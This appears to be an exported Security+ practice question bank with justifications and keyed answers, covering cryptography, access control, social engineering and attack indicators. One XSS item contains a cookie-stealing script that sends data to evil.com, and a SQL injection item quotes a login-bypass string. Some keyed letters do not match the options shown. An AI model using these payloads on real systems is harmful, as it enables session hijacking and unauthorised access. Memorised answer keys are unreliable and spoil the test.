questions.justification: Two problems here: (1) MD5 is cryptographically broken — collision attacks exist where different inputs produce the same hash. (2) Without salting, rainbow table attacks precompute hashes for common passwords and simply look up the hash. A "salt" is random data added to the password before hashing, making every hash unique even for identical passwords. Modern password storage should use bcrypt, scrypt, or Argon2 — which are deliberately slow and include built-in salting.
questions.review_notes: SME review: correct - Keyed answer B (MD5 is cryptographically broken and vulnerable to rainbow table attacks without ) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: Which access control model uses security LABELS (e.g., Top Secret, Secret, Confidential) assigned to both subjects and objects?
questions.justification: MAC uses security LABELS/classifications — both users (clearance level) and data (classification level) have labels. Access is only granted when clearance ≥ classification. Used by government/military. DAC = resource owner sets permissions (Windows NTFS). RBAC = permissions assigned to job roles. Rule-based = access based on rules (like firewall rules, time-of-day restrictions). Key word "labels" → MAC. Key word "roles" → RBAC. Key word "owner controls" → DAC.
questions.review_notes: SME review: correct - Keyed answer D (Mandatory Access Control (MAC)) is correct for SY0-701 4.6; distractors are clearly wrong.

questions.question: During a software deployment, which change management concept validates that the software running in production EXACTLY matches the approved tested version?
questions.justification: A configuration baseline documents the approved, tested, secure state of a system. Integrity monitoring (using hashes) verifies the running system matches the baseline — if any file changes, an alert fires. Tools like Tripwire, AIDE, and FIM (File Integrity Monitoring) implement this. This is how you detect unauthorized changes to production systems. CAB review approves changes; emergency change handles urgent fixes; SOP provides procedures — none of these verify the current running state matches what was approved.
questions.review_notes: SME review: correct - Keyed answer C (Configuration baseline and integrity monitoring) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: Steganography is BEST described as which of the following?

options.text: Encrypting data with a symmetric key algorithm
Hiding secret data within ordinary, non-secret files (images, audio, video)
Hashing data to verify file integrity
Digitally signing documents to ensure non-repudiation

questions.justification: Steganography = hiding secret information within innocent-looking carrier files. A text message can be hidden in an image by slightly modifying pixel values — invisible to the naked eye. Unlike encryption (which hides the CONTENT), steganography hides the EXISTENCE of the message. Attackers use steganography to exfiltrate data undetected (e.g., hiding stolen credentials in uploaded images). DLP tools may scan for steganographic content in outbound data.
questions.review_notes: SME review: correct - Keyed answer B (Hiding secret data within ordinary, non-secret files (images, audio, video)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A company implements a zero-trust architecture. Which statement BEST describes the core principle of zero trust?

options.text: Trust all internal network traffic; verify only external connections
Allow access once authenticated from a corporate device
Block all external traffic and rely on perimeter firewalls
Never trust, always verify — every access request is authenticated and authorized regardless of location

questions.justification: Zero trust abandons the "castle and moat" model where internal network = trusted. With cloud apps, remote workers, and mobile devices, there IS no clear perimeter. Zero trust says: every request must be authenticated, authorized, and continuously verified — regardless of where it comes from (inside or outside the network). Key zero trust components: identity verification, device health checks, least privilege, micro-segmentation, and continuous monitoring. The perimeter is now the identity, not the network.
questions.review_notes: SME review: correct - Keyed answer D (Never trust, always verify — every access request is authenticated and authorize) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: Which cryptographic concept describes an algorithm where the same key is used for both encryption AND decryption?
questions.justification: Symmetric encryption uses ONE shared key for both encryption and decryption. Examples: AES, DES, 3DES, RC4, Blowfish, ChaCha20. Fast and efficient for large data. Problem: secure key distribution (how do you share the key securely?). Asymmetric (public key) uses a KEY PAIR — public key encrypts, private key decrypts. Hashing is one-way (no decryption). Digital signatures use asymmetric keys. Symmetric = same key both ways = fast but key distribution challenge.
questions.review_notes: SME review: correct - Keyed answer A (Symmetric encryption) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A secure email system uses the RECIPIENT'S public key to encrypt a message. Only the recipient can decrypt it. Which concept does this demonstrate?
questions.justification: Asymmetric encryption for confidentiality: encrypt with the RECIPIENT's PUBLIC key → only the recipient's PRIVATE key can decrypt. This is how PGP/GPG email encryption works. Compare with digital signatures: sign with YOUR OWN PRIVATE key → anyone with your public key can verify the signature. Memory trick: "Lock with public key (anyone can lock), unlock with private key (only you can open)" = confidentiality. "Sign with private key, verify with public key" = authentication/non-repudiation.
questions.review_notes: SME review: correct - Keyed answer B (Asymmetric encryption for confidentiality) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A hospital implements role-based access control where doctors can view and modify patient records, nurses can view records, and billing staff can only see billing information. What additional principle is BEST demonstrated here?
questions.justification: Need-to-know = employees only access information essential for their specific job function. Billing staff have no medical reason to see clinical records, so they don't get access — even if they have the appropriate security clearance. This is subtly different from least privilege (which limits technical permissions to minimum required). Need-to-know is an informational principle — you're qualified but you don't need this particular information for your role. HIPAA compliance requires need-to-know for protected health information (PHI).
questions.review_notes: SME review: correct - Key C (need-to-know) fits billing staff being denied clinical data; least privilege is absent from the options, so C is the best answer.

questions.question: Which protocol provides real-time certificate status checking as an alternative to downloading the full Certificate Revocation List (CRL)?
questions.justification: OCSP provides real-time, on-demand certificate status checking. Instead of downloading the entire CRL (which can be huge and outdated), a client sends the certificate's serial number to the CA's OCSP responder and gets back "valid," "revoked," or "unknown." OCSP stapling improves performance — the web server caches the OCSP response and attaches ("staples") it to the TLS handshake. LDAPS = LDAP over SSL. RADIUS = network authentication. Kerberos = enterprise authentication protocol.
questions.review_notes: SME review: correct - Keyed answer B (OCSP (Online Certificate Status Protocol)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A company uses TLS 1.3 for all web traffic. Compared to TLS 1.2, what is the PRIMARY security improvement in TLS 1.3?

options.text: Removed weak cipher suites and mandates Perfect Forward Secrecy

questions.justification: TLS 1.3 major improvements over 1.2: (1) Removed all weak cipher suites (RC4, DES, 3DES, MD5, SHA-1, RSA key exchange, static DH). (2) Mandates Perfect Forward Secrecy — ONLY ECDHE/DHE key exchange allowed. (3) Faster handshake (1-RTT vs 2-RTT, with 0-RTT resumption). (4) Encrypted more of the handshake. PFS means session keys are ephemeral — even future private key theft can't decrypt past sessions. TLS 1.3 = more secure + faster. SHA-1 (B) was already deprecated in TLS 1.2.
questions.review_notes: SME review: correct - Keyed answer D (Removed weak cipher suites and mandates Perfect Forward Secrecy) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A threat actor group infiltrated a defense contractor's network and maintained persistent access for 14 months while exfiltrating classified weapons design documents. The group used custom malware and exploited multiple zero-day vulnerabilities. Which threat actor type BEST describes this group?
questions.justification: The defining characteristics here are: custom malware (not off-the-shelf tools), multiple zero-day exploits (extremely expensive and rare), 14-month dwell time (APT-style patience), and espionage motivation (classified weapons designs). This is the textbook definition of a nation-state APT (Advanced Persistent Threat). Organized crime (A) focuses on financial gain — ransomware, card fraud — not weapons espionage. Hacktivists (C) announce their attacks publicly and use DDoS/defacement. Insider threats (D) are internal to the organization. Only nation-states have the resources, motivation, and capability described here.
questions.review_notes: SME review: correct - Keyed answer B (Nation-state) is correct for SY0-701 2.1; distractors are clearly wrong.

questions.question: An employee in the marketing department installs Dropbox on their work laptop to easily share files with external clients, without going through the IT approval process. This is BEST classified as:
questions.justification: Shadow IT is specifically defined as the use of unauthorized IT systems or applications within an organization — often for convenience — without IT department approval or oversight. The employee is not being malicious (no intent to harm), so this is not an insider threat in the malicious sense. Data exfiltration implies deliberate data theft with malicious intent. The key distinguisher: Shadow IT is about using UNAPPROVED tools for LEGITIMATE productivity purposes, bypassing IT governance. The security risk is real (no DLP, no visibility, potential data stored in unmanaged cloud) but the intent is innocent.
questions.review_notes: SME review: correct - Keyed answer D (Shadow IT) is correct for SY0-701 2.1; distractors are clearly wrong.

questions.question: A group of hackers takes down a pharmaceutical company's website for 48 hours and releases internal emails showing price-gouging practices. The group announces "We are doing this for the people who can't afford medicine." What is the PRIMARY motivation of this threat actor?
questions.justification: The attacker explicitly states their motivation: concern about medicine affordability — a social/political cause. This is the hallmark of a hacktivist group (similar to Anonymous). The tactics — DDoS to disrupt service + data leak to expose wrongdoing — are classic hacktivist methods used to publicize a cause. Financial gain (A) would involve demanding money. Espionage (C) would involve quietly extracting information without revealing it publicly. Blackmail (D) would involve threatening to release data unless a demand is met. Publicly releasing the data to expose injustice = philosophical/political motivation.
questions.review_notes: SME review: correct - Keyed answer B (Philosophical/political beliefs) is correct for SY0-701 2.1; distractors are clearly wrong.

questions.question: An attacker registers the domain "micros0ft.com" (with zero instead of letter o) and creates a convincing Microsoft login page. Users who mistype the URL are directed to this page where their credentials are captured. What technique is this?
questions.justification: Typosquatting (also called URL hijacking) involves registering domain names that are slight misspellings or variations of legitimate domains, specifically to capture users who make typing errors. "micros0ft.com" with a zero replacing the letter 'o' is a classic typosquatting example. Brand impersonation (B) is a broader term that includes copying logos and creating fake pages — typosquatting is a specific technique within brand impersonation, but when the question specifically mentions a misspelled domain, typosquatting is the most precise answer. Watering hole (D) involves compromising a legitimate site already visited by targets. Vishing (A) uses voice calls.
questions.review_notes: SME review: correct - Keyed answer C (Typosquatting) is correct for SY0-701 2.2; distractors are clearly wrong.

questions.question: An attacker calls a bank employee and says: "Hi, this is David from IT support. We've detected suspicious activity on your account. I need you to verify your system password so I can lock out the attacker." What social engineering technique is primarily being used?
questions.justification: This scenario uses TWO techniques: (1) Vishing — the attack is conducted via voice call. (2) Pretexting — the attacker creates a fabricated SCENARIO ("suspicious activity detected," "I'm from IT support") to make the request seem legitimate. Pretexting is specifically the creation of a false context/story (the pretext) that gives the attacker credibility to make an unusual request. Phishing (A) is email-based. Smishing (B) is SMS-based. Simple impersonation (D) is pretending to be someone — but pretexting adds the fabricated scenario around the impersonation. The exam often tests the difference between impersonation alone and impersonation WITH a fabricated story (pretexting).
questions.review_notes: SME review: correct - Keyed answer C (Pretexting with vishing) is correct for SY0-701 2.2; distractors are clearly wrong.

questions.question: Employees of a cybersecurity company frequently visit a niche industry forum for threat intelligence. An attacker compromises that forum website and injects malware that silently installs on visitors' machines. What attack type is this?
questions.justification: A watering hole attack compromises a website that the TARGET AUDIENCE is known to visit regularly — analogous to predators waiting at a watering hole for prey. The key elements: attacker researched which site the targets (cybersecurity employees) frequent, compromised THAT specific site, and infected visitors. Spear phishing (A) is a targeted email attack. Typosquatting (C) involves misspelled domain names. Drive-by download (D) is a generic term for malware that downloads when visiting a site — but the SPECIFIC attack pattern of targeting a site because your targets visit it is called a watering hole attack. Drive-by download describes the delivery mechanism; watering hole describes the strategy.
questions.review_notes: SME review: correct - Keyed answer B (Watering hole attack) is correct for SY0-701 2.2; distractors are clearly wrong.

questions.question: A security team discovers an attacker inserted malicious code into an update package distributed by a major enterprise software vendor. 800 of the vendor's clients unknowingly installed the compromised update. This is BEST described as:
questions.justification: A supply chain attack targets a vendor or supplier that provides products/services to the actual targets. By compromising the vendor's update package, the attacker reaches hundreds of organizations who trust that vendor — far more efficient than attacking each individually. This is the exact pattern of the SolarWinds attack (2020). Watering hole (B) involves compromising a website targets visit — not a software update package. Malicious insider (C) implies the attacker is an employee of the victim organization — here the breach is at the vendor level. Zero-day (D) could be used in the attack but isn't what defines this attack — the defining characteristic is exploitation of the supply chain trust relationship.
questions.review_notes: SME review: correct - Keyed answer A (Supply chain attack) is correct for SY0-701 2.2; distractors are clearly wrong.

questions.question: A web application allows users to submit comments. An attacker submits the following as a comment: <script>document.location='https://evil.com?c='+document.cookie</script>. When other users view the page, their session cookies are sent to the attacker's server. What vulnerability is being exploited?
questions.justification: XSS occurs when an attacker injects malicious client-side scripts (JavaScript) into web pages viewed by other users. The website stores the script (stored/persistent XSS) and when victims load the page, their browsers execute it — in this case stealing session cookies. The script runs in the VICTIM'S browser, not on the server. SQL injection (A) targets the database server with malicious SQL code — the injected content here is JavaScript, not SQL. Buffer overflow (B) is a memory management attack in applications, not a web scripting issue. Directory traversal (D) involves manipulating file paths to access restricted files. The presence of <script> tags in user input that the server reflects back = XSS.
questions.review_notes: SME review: correct - Keyed answer C (Cross-site scripting (XSS)) is correct for SY0-701 2.3; distractors are clearly wrong.

questions.question: A login form accepts the following input in the username field: ' OR 1=1 --. This causes the application to return all user records and log in as the first user (admin). What mitigation would have BEST prevented this?
questions.justification: SQL injection is prevented by ensuring user input is NEVER treated as SQL code. Parameterized queries (prepared statements) separate the SQL code from the data — the query structure is defined first, then data values are passed separately. The database knows the user's input is a string literal, not code, so ' OR 1=1 -- is treated as a username string, not executable SQL. Output encoding (A) prevents XSS by encoding characters in HTML output — not relevant for database queries. Content Security Policy (C) is an XSS mitigation. Stack canaries (D) prevent buffer overflow attacks. Parameterized queries are THE standard mitigation for SQLi — if you remember nothing else about SQLi, remember this.
questions.review_notes: SME review: correct - Keyed answer B (Parameterized queries (prepared statements)) is correct for SY0-701 2.3; distractors are clearly wrong.

questions.question: A malicious process running inside a virtual machine exploits a vulnerability in the hypervisor software and gains the ability to execute code on the host operating system, accessing other virtual machines on the same physical server. What vulnerability was exploited?
questions.justification: VM escape is specifically the attack where a process inside a VM breaks out of the virtualized environment to interact with the hypervisor or host OS — exactly what's described. The key: the attacker CROSSED THE BOUNDARY between the guest VM and the host, which should be a strict security boundary. Resource reuse (B) involves data leaking between VMs through improperly shared resources — data leaks, not code execution on the host. While privilege escalation (D) may be involved in the process, the specific vulnerability type being tested is VM escape — the crossing of the hypervisor boundary. Side-channel (C) attacks exploit indirect information (timing, power consumption) — not described here.
questions.review_notes: SME review: correct - Keyed answer A (VM escape) is correct for SY0-701 2.3; distractors are clearly wrong.

questions.question: A developer's application checks whether a file exists (Time of Check), and then opens it (Time of Use). An attacker replaces the file with a malicious version between these two operations. What type of vulnerability is this?
questions.justification: This is the textbook TOC/TOU (Time of Check/Time of Use) race condition. The vulnerability exists in the GAP between when a condition is verified (TOC: file exists check) and when the resource is used (TOU: file is opened). An attacker exploits this window to change the resource so it's different when used than when checked. The question explicitly uses the TOC/TOU terminology, making this unambiguous. Buffer overflow (A) involves memory boundary violations. Memory injection (B) involves inserting code into a process's memory. Malicious update (D) involves compromising a software update pipeline. The two-step check-then-use with an exploitable gap in between = race condition.
questions.review_notes: SME review: correct - Keyed answer C (Race condition (TOC/TOU)) is correct for SY0-701 2.3; distractors are clearly wrong.

questions.question: A user downloads an app from an unofficial third-party website onto their Android phone, bypassing the Google Play Store. The app contains spyware that captures banking credentials. What vulnerability category enabled this attack?
questions.justification: Sideloading is installing applications from OUTSIDE the official app store, bypassing the security review process. On Android, users can enable "Unknown sources" to allow this. The app store's review process catches most malware — sideloaded apps skip this check entirely. This is distinct from jailbreaking (B), which involves removing OS-level restrictions and requires technical exploitation of the OS itself — you don't need to jailbreak to sideload on Android, you just enable a setting. Jailbreaking is more relevant on iOS where the OS normally prevents any installation outside the App Store. The scenario describes Android, unofficial website download, no OS modification described = sideloading.
questions.review_notes: SME review: correct - Keyed answer A (Sideloading) is correct for SY0-701 2.3; distractors are clearly wrong.

questions.question: A security analyst reviewing authentication logs sees that the account "jsmith" has had exactly 2 failed login attempts — but this exact pattern appears across 450 user accounts over the past hour. What type of attack is MOST likely occurring?

options.text: Brute force attack against jsmith specifically

questions.justification: Password spraying is characterized by: FEW attempts per account (here: 2) across MANY accounts (here: 450). The attacker tries a small set of commonly used passwords (Password1!, Welcome1, Company2024!) against every account without triggering lockout policies. This is designed specifically to avoid account lockout by staying below the threshold. Brute force (A) would involve hundreds or thousands of attempts against a SINGLE account, triggering lockout. Credential stuffing (B) uses username/password pairs from previously breached databases — the pattern would show one or zero attempts per account. Keylogger (D) would capture credentials directly, not generate failed login attempts. Low-per-account + many accounts = spraying.
questions.review_notes: SME review: correct - Keyed answer C (Password spraying) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: Security monitoring shows that a VPN account successfully authenticated from New York at 9:03 AM. At 9:11 AM, the same account successfully authenticated from Tokyo. The security team should FIRST:

options.text: Reset the user's password and wait for them to contact the helpdesk
Immediately terminate both sessions and investigate the compromised credentials
Send an email to the user asking if they're traveling
Add the Tokyo IP to the deny list

questions.justification: This is a clear impossible travel indicator — New York to Tokyo in 8 minutes is physically impossible. This strongly indicates credential theft and active unauthorized access. The immediate response is to terminate BOTH sessions (one is the legitimate user, one is the attacker — you don't know which is which) and begin investigation. Simply resetting the password (A) without terminating sessions leaves the active attacker connected. Emailing the user (C) is too slow and alerts the attacker if they've compromised email too. Blocking just the Tokyo IP (D) is insufficient — the attacker may use a different IP. The impossible travel indicator requires immediate session termination as the first action, followed by investigation and credential remediation.
questions.review_notes: SME review: correct - Key B is the best first response to an impossible-travel indicator (kill active sessions, then investigate); disabling the account would also be reasonable but is not offered.

questions.question: After a security incident investigation, a forensics team finds that logs from the critical file server are completely absent for a 4-hour window during the suspected attack timeframe. All other servers have logs for that period. What does this MOST likely indicate?

options.text: The file server was offline for maintenance
A logging misconfiguration that existed before the attack
Storage capacity issues caused log rotation to overwrite entries
Attacker tampered with or deleted logs to cover their tracks

questions.justification: Missing logs are a named Security+ indicator of malicious activity (specifically listed in objective 2.4). When logs are missing from ONLY the targeted system, during the EXACT timeframe of the suspected attack, this strongly indicates deliberate log tampering or deletion to cover evidence of the attack. All other servers have logs for that period — ruling out a systemic logging failure. Maintenance (A) would typically appear in change management records and wouldn't explain why only that server's logs are missing. Pre-existing misconfiguration (B) would show missing logs before the attack timeframe too. Storage rotation (C) would typically affect the oldest logs, not a specific 4-hour window. Log gaps during incident timeframes = attacker anti-forensics.
questions.review_notes: SME review: correct - Keyed answer D (Attacker tampered with or deleted logs to cover their tracks) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: Users report they can access a website normally, but they're seeing strange certificate warnings even on sites they visit daily. An analyst captures traffic and sees it's being redirected through an unknown proxy. What attack is occurring?
questions.justification: An on-path attack (formerly called man-in-the-middle) intercepts communication between two parties — placing the attacker's system between the user and the server. The classic indicators are: (1) Certificate warnings — the attacker presents their own certificate instead of the server's, causing the browser to warn about an untrusted certificate. (2) Traffic routed through unknown proxy — the attacker's system is the intermediary. Users can still access sites because the attacker forwards their requests and responses, but the attacker can read and modify all traffic. DDoS (A) would prevent access. DNS attack (B) would redirect to a completely different IP, not proxy traffic. Credential replay (D) reuses captured credentials, not intercept active sessions.
questions.review_notes: SME review: correct - Keyed answer C (On-path (man-in-the-middle) attack) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: A system administrator notices that a process on a production server is consuming 95% of the CPU and making frequent outbound connections to cryptocurrency mining pools. No authorized mining software is installed. What type of attack is this?
questions.justification: Cryptojacking uses unauthorized computing resources to mine cryptocurrency for the attacker. The indicators here are textbook: excessive CPU consumption (mining is CPU/GPU intensive), outbound connections to mining pools (where the mined currency is sent to the attacker). The attacker profits from your electricity and hardware while you see performance degradation. Ransomware (A) would encrypt files, not consume CPU for mining. Worms (C) cause high NETWORK traffic (replication/spreading) — the key indicator here is CPU consumption and mining pool connections. Keyloggers (D) run quietly with minimal resource footprint and would cause unusual outbound traffic with captured keystrokes, not mining pool connections. High CPU + mining pool connections = cryptojacking.
questions.review_notes: SME review: correct - Keyed answer B (Cryptojacking (malicious crypto-mining)) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: An attacker captures a valid Kerberos ticket from a user's workstation and uses it to authenticate to multiple servers over the next 8 hours. Which attack type is this?
questions.justification: Credential replay (also called pass-the-ticket in Kerberos environments) involves capturing a valid authentication credential (ticket, token, hash) and replaying it to authenticate without knowing the original password. The attacker captured the Kerberos ticket, then REUSED it to access servers — that's a replay. Brute force (A) tries many passwords to find the correct one — no brute force is happening here. Birthday attack (B) is a cryptographic attack finding hash collisions — not credential reuse. Downgrade (D) forces weaker protocols. Mitigation for replay attacks: timestamps on tokens (so old tokens are rejected), nonces (single-use values), short session expiry, Kerberos short ticket lifetimes.
questions.review_notes: SME review: correct - Keyed answer C (Credential replay) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: A user reports that their antivirus keeps running scans but never detects any malware, even though their system is behaving strangely — files appear hidden, processes aren't showing up in Task Manager, and the system is sluggish. What type of malware is MOST likely present?
questions.justification: A rootkit operates at the kernel level — it modifies the OS itself to hide its presence. This explains why: (1) Antivirus doesn't detect it — the rootkit intercepts antivirus scans and hides itself from them. (2) Files and processes are hidden — the rootkit patches OS functions that list files/processes to exclude its own. (3) Traditional detection tools fail. The name comes from "root" (highest privilege level) and "kit" (toolkit). Detection requires specialized tools that boot from clean media (offline scanning), not the compromised OS itself. Ransomware (A) would encrypt files — you'd know immediately. Logic bomb (B) is dormant until triggered, not causing ongoing issues. Worm (C) would primarily cause network traffic spikes.
questions.review_notes: SME review: correct - Keyed answer D (Rootkit) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: Two different files — a legitimate software installer and a malware executable — produce the same SHA-1 hash value. What cryptographic attack has been exploited and what is the implication?

options.text: Collision attack; SHA-1 is compromised for integrity verification
Birthday attack; salt must be added to SHA-1
Brute force attack; SHA-1 key needs to be longer

questions.justification: A collision attack finds two DIFFERENT inputs that produce the SAME hash output. SHA-1 has been shown to have practical collision vulnerabilities (Google's SHAttered attack in 2017 demonstrated a practical SHA-1 collision). The implication: if an attacker can create a malware file with the same SHA-1 hash as a legitimate installer, integrity verification based on SHA-1 would show "hash matches = file is legitimate" — even for the malware. This completely undermines hash-based integrity checking. The fix: switch to SHA-256 or SHA-3 which are much larger hash spaces. Birthday attacks (C) are related but specifically about the statistical probability aspect. Adding salt (C) is for password hashing, not file integrity. SHA-1 + two files + same hash = collision attack.
questions.review_notes: SME review: correct - Keyed answer B (Collision attack; SHA-1 is compromised for integrity verification) is correct for SY0-701 2.4; distractors are clearly wrong.

questions.question: After a ransomware attack spreads across an organization's entire flat network, the CISO mandates that the network must be redesigned so that future attacks can only affect one department at a time. What mitigation technique addresses this requirement?
questions.justification: The CISO's requirement is to CONTAIN future attacks to a single department — this is precisely the purpose of network segmentation. A flat network allows lateral movement across the entire organization once a single machine is compromised.
